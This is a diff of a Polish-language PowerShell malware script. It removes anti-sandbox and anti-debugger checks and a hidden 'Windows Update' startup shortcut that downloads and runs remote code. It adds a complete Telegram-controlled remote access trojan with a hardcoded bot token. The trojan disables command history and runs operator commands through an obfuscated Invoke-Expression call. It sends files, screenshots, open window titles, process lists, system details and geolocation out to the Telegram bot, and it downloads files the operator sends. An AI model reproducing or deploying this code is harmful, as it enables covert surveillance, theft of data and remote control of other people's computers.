@@ -1,48 +1,210 @@
-try {
-    # --- Anti-Analysis Checks ---
-    $cs = gwmi Win32_ComputerSystem
-    $os = gwmi Win32_OperatingSystem
-    $pr = gwmi Win32_Processor
-    $mem = [math]::Round($cs.TotalPhysicalMemory / 1GB)
-    $sw = [Diagnostics.Stopwatch]::StartNew(); Start-Sleep -Milliseconds 200; $sw.Stop()
+Clear-Host
+Set-PSReadlineOption -HistorySaveStyle SaveNothing
+Set-Location -Path $env:USERPROFILE
 
-    if (
-        $cs.Manufacturer -match 'VMware|VirtualBox' -or
-        $cs.Model -match 'Virtual|KVM' -or
-        $cs.UserName -match 'sandbox|test|analyst' -or
-        $env:USERNAME -match 'sandbox|test|analyst' -or
-        $cs.Name -match 'sandbox|win7' -or
-        $cs.Domain -match 'sandbox|workgroup' -or
-        $pr.NumberOfLogicalProcessors -le 2 -or
-        $mem -lt 2 -or
-        $os.LastBootUpTime -gt (Get-Date).AddMinutes(-5) -or
-        ((gwmi Win32_DiskDrive) | ? { $_.Model -match 'VBOX|VMWARE|QEMU|XEN' }) -or
-        ($sw.ElapsedMilliseconds -gt 500)
-    ) { exit }
+$session                    = New-Object Microsoft.PowerShell.Commands.WebRequestSession
+$telegram_id, $api_token    = "2118389773", "8450505822:AAG_yBZaOGpYdKN4dFZTfEtNF_Vfk_71YQ0"
+$api_get_updates            = 'https://api.telegram.org/bot{0}/getUpdates' -f $api_token
+$api_send_messages          = 'https://api.telegram.org/bot{0}/SendMessage' -f $api_token
+$api_get_file               = 'https://api.telegram.org/bot{0}/getFile?file_id=' -f $api_token
+$api_download_file          = 'https://api.telegram.org/file/bot{0}/' -f $api_token
+$api_upload_file            = 'https://api.telegram.org/bot{0}/sendDocument?chat_id={1}' -f $api_token, $telegram_id
+$api_get_me                 = 'https://api.telegram.org/bot{0}/getMe' -f $api_token
+$session_id                 = $env:COMPUTERNAME
+$Global:ProgressPreference  = 'SilentlyContinue'
 
-    # --- Suspicious Process Detection ---
-    $banned = 'x64dbg,ida,ida64'.Split(',')
-    $procs = ps | % { $_.Name }
-    if ($banned | ? { $procs -contains $_ }) { exit }
+function SendMessage($output, $cmd) {
+    $output = $output -replace "([$([regex]::Escape('_*``[\'))])", "\`$1"
+    $MessageToSend = @{
+        chat_id    = $telegram_id
+        parse_mode = "MarkdownV2"
+        text       = "```````nIP: $(Invoke-RestMethod -Uri "ident.me" -WebSession $session)`n`SESSION ID: $session_id`nPATH: [$(((Get-Location).Path).Replace("\","/"))]`nCMD: $cmd`n`n$output`n``````"
+    }
+    $MessageToSend = $MessageToSend | ConvertTo-Json
+    try {
+        Invoke-RestMethod -Method Post -Uri $api_send_messages -Body $MessageToSend -ContentType "application/json; charset=utf-8" -WebSession $session | Out-Null
+    } catch { Start-Sleep -Seconds 3 }
+}
 
-    # --- Autostart shortcut logic ---
-    $payloadUrl = "https://twojastrona.com/skrypt.ps1"  # <<-- SWÓJ URL TUTAJ
-    $startup = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup"
-    $lnkPath = Join-Path $startup "WinUpd.lnk"
+function DownloadFile($file_id, $file_name) {
+    $get_file_path  = Invoke-RestMethod -Method Get -Uri ($api_get_file + $file_id) -WebSession $session
+    $file_path      = $get_file_path.result.file_path
+    Invoke-RestMethod -Method Get -Uri ($api_download_file + $file_path) -OutFile $file_name -WebSession $session
+    if (Test-Path -Path $file_name) { SendMessage "Plik został pobrany pomyślnie" } 
+    else { SendMessage "Plik nie został pobrany" }
+}
 
-    if (-not (Test-Path $lnkPath)) {
-        $WshShell = New-Object -ComObject WScript.Shell
-        $Shortcut = $WshShell.CreateShortcut($lnkPath)
-        $Shortcut.TargetPath = "$env:WINDIR\System32\WindowsPowerShell\v1.0\powershell.exe"
-        $Shortcut.Arguments = "-w hidden -nop -c `"iex(irm '$payloadUrl')`""
-        $Shortcut.WindowStyle = 7
-        $Shortcut.IconLocation = "$env:SystemRoot\system32\shell32.dll,13"
-        $Shortcut.Description = "Windows Update Task"
-        $Shortcut.Save()
-        (Get-Item $lnkPath).Attributes = 'Hidden'
+function SendFile($filePath) {
+    SendMessage "Przystępuję do wysłania pliku [$($filePath)]"
+    if (Test-Path -Path $filePath -PathType Leaf) {
+        try { curl.exe -F document=@"$filePath" $api_upload_file --insecure | Out-Null } 
+        catch { SendMessage "Błąd podczas przesyłania pliku: [$($Error[0])]" }
+    } else { SendMessage "Wskazany plik nie został znaleziony" }
+}
+
+function SendScreenshot {
+    Add-Type -AssemblyName System.Drawing
+    Add-Type -AssemblyName System.Windows.Forms
+    $left = [Int32]::MaxValue
+    $top = [Int32]::MaxValue
+    $right = [Int32]::MinValue
+    $bottom = [Int32]::MinValue
+    foreach ($screen in [Windows.Forms.Screen]::AllScreens) {
+        if ($screen.Bounds.X -lt $left) { $left = $screen.Bounds.X }
+        if ($screen.Bounds.Y -lt $top) { $top = $screen.Bounds.Y }
+        if ($screen.Bounds.X + $screen.Bounds.Width -gt $right) { $right = $screen.Bounds.X + $screen.Bounds.Width }
+        if ($screen.Bounds.Y + $screen.Bounds.Height -gt $bottom) { $bottom = $screen.Bounds.Y + $screen.Bounds.Height }
+    }
+    $bounds = [Drawing.Rectangle]::FromLTRB($left, $top, $right, $bottom)
+    $bmp = New-Object Drawing.Bitmap $bounds.Width, $bounds.Height
+    $graphics = [Drawing.Graphics]::FromImage($bmp)
+    $graphics.CopyFromScreen($bounds.Location, [Drawing.Point]::Empty, $bounds.size)
+    $bmp.Save("$env:APPDATA\screenshot.png")
+    $graphics.Dispose(); $bmp.Dispose()
+    SendFile "$env:APPDATA\screenshot.png"
+    Remove-Item -Path "$env:APPDATA\screenshot.png" -Force
+}
+
+function TestTelegramAPI {
+    try { 
+        Invoke-RestMethod -Uri $api_get_me -TimeoutSec 3 -ErrorAction Stop | Out-Null
+        return $true 
+    } catch { return $false }
+}
+
+function Get-WindowTitles {
+    Add-Type @"
+using System;
+using System.Text;
+using System.Runtime.InteropServices;
+public class Win32 {
+    [DllImport("user32.dll")] public static extern int EnumWindows(Delegate cb, IntPtr extra);
+    public delegate bool EnumWindowsProc(IntPtr hWnd, IntPtr lParam);
+    [DllImport("user32.dll")] public static extern int GetWindowText(IntPtr hWnd, StringBuilder text, int count);
+    [DllImport("user32.dll")] public static extern bool IsWindowVisible(IntPtr hWnd);
+}
+"@
+    $titles = @()
+    $callback = [Win32+EnumWindowsProc]{
+        param($hWnd, $lParam)
+        if ([Win32]::IsWindowVisible($hWnd)) {
+            $buffer = New-Object System.Text.StringBuilder 256
+            [Win32]::GetWindowText($hWnd, $buffer, $buffer.Capacity) | Out-Null
+            $title = $buffer.ToString()
+            if ($title) { $titles += $title }
+        }
+        return $true
+    }
+    [Win32]::EnumWindows($callback, [IntPtr]::Zero) | Out-Null
+    return $titles
+}
+
+function Get-SystemInfo {
+    $os = Get-CimInstance Win32_OperatingSystem
+    $cs = Get-CimInstance Win32_ComputerSystem
+    $bios = Get-CimInstance Win32_BIOS
+
+    return @"
+Komputer: $($cs.Name)
+System: $($os.Caption) $($os.OSArchitecture)
+Wersja: $($os.Version) ($($os.BuildNumber))
+Producent: $($cs.Manufacturer)
+Model: $($cs.Model)
+RAM: $([math]::Round($cs.TotalPhysicalMemory / 1GB, 2)) GB
+BIOS: $($bios.SMBIOSBIOSVersion)
+"@
+}
+
+function Get-GeoLocation {
+    try {
+        $geo = Invoke-RestMethod -Uri "http://ip-api.com/json/" -WebSession $session
+        return @"
+🌍 Lokalizacja:
+Kraj: $($geo.country)
+Region: $($geo.regionName)
+Miasto: $($geo.city)
+Dostawca: $($geo.isp)
+IP: $($geo.query)
+"@
+    } catch {
+        return "Nie udało się pobrać geolokalizacji"
     }
 }
-catch {
-    # Silent fail
-    exit
+
+function CommandListener {
+    $offset = 0
+    Add-Type -AssemblyName System.Windows.Forms
+    [System.Windows.Forms.Cursor]::Position = [System.Windows.Forms.Cursor]::Position
+    $PreviousStatus = $null
+
+    while ($true) {
+        try {
+            $CurrentStatus = TestTelegramAPI
+            if ($CurrentStatus -ne $PreviousStatus) {
+                if ($CurrentStatus) { SendMessage "Computer online" }
+                $PreviousStatus = $CurrentStatus
+            }
+
+            Start-Sleep -Milliseconds 1000
+            $message = Invoke-RestMethod -Method Get -Uri $api_get_updates -WebSession $session
+            if (($message.result.Count -gt 0) -and ($message.result.Count -gt $offset)) {
+                if ($offset -eq 0) { 
+                    $offset = $message.result.Count
+                    Start-Sleep -Seconds 1
+                    continue 
+                }
+
+                $offset     = $message.result.Count
+                $message    = $message.result.Message[-1]
+                $user_id    = $message.chat.id
+                $username   = $message.chat.username
+                $text       = $message.text
+                $document   = $message.document
+                $sid        = $text.Split(" ")
+                $text       = $sid[1..($sid.Length - 1)] -join " "
+
+                if ($user_id -notmatch $telegram_id) {
+                    SendMessage "Nieautoryzowany użytkownik: $user_id próbuje wykonać komendę: $text"
+                    continue
+                }
+
+                if ($text -match "/online")   { SendMessage "Sesja aktywna" $text }
+                if ($text -match "/exit")     { SendMessage "Sesja zakończona" $text; exit }
+                if ($text -match "/windows")  { $titles = Get-WindowTitles | Out-String; SendMessage $titles $text }
+                if ($text -match "/plist")    { $plist = Get-Process | Sort-Object CPU -Descending | Select-Object -First 10 Name, Id, CPU | Format-Table -AutoSize | Out-String; SendMessage $plist $text }
+                if ($text -match "/sysinfo")  { $sysinfo = Get-SystemInfo; SendMessage $sysinfo $text }
+                if ($text -match "/geoloc")   { $geo = Get-GeoLocation; SendMessage $geo $text }
+
+                if ($sid[0] -notmatch $session_id) { continue }
+
+                if ($text.Length -gt 0) {
+                    try {
+                        $cmdTest = $text -split ' ' | Select-Object -First 1
+                        if ($cmdTest -match "cd" -or $cmdTest -match "Set-Location") { $text = $text + "; ls" }
+                        $output = .(Get-Alias ?e[?x])($text) | Out-String
+                    } catch { $output = $Error[0] | Out-String }
+
+                    $output_splitted = for ($i = 0; $i -lt $output.Length; $i += 2048) {
+                        $output.Substring($i, [Math]::Min(2048, $output.Length - $i))
+                    }
+
+                    foreach ($block in $output_splitted) {
+                        SendMessage $block $text
+                        Start-Sleep -Milliseconds 100
+                    }
+
+                    if ($output.Count -lt 1) { SendMessage ("Polecenie wykonane: " + $text) }
+                }
+
+                if ($document) {
+                    $file_id = $document.file_id
+                    $file_name = $document.file_name
+                    DownloadFile $file_id $file_name
+                }
+            }
+        } catch { Start-Sleep -Seconds 5 }
+    }
+    $session.Dispose()
 }
+
+CommandListener
